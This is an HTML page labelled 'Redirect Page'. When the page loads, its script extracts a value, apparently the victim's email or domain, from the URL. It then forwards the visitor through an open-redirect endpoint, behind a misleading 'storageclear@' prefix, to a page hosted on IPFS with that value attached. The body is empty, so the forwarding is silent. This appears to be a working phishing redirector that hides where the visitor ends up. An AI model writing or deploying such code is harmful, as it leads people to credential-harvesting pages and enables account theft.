<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect Page</title>
  <link rel="stylesheet" href="style.css">
  <script>
    function redirectNow() {
      var queryString = window.location.href;
      var email = queryString.split("&");
      var root = email[1];
      var cross = root.split("?eta=");
      var dom = cross[0];

      var redirect = "https://storageclear@environmentalscience.org/out.php?link=https://bafkreicirtuunpf4vwtkwrp544h3ahqq3hkskuigfzsyht2hzfnvt6jl74.ipfs.dweb.link/?eta={domain}";
      var link = redirect.replace("{domain}", dom);
      window.location.href = link;
    }

    // Trigger redirect automatically once the page has finished loading
    window.onload = redirectNow;
  </script>
</head>
<body>
  <!-- No button needed, the user is redirected automatically -->
</body>
</html>
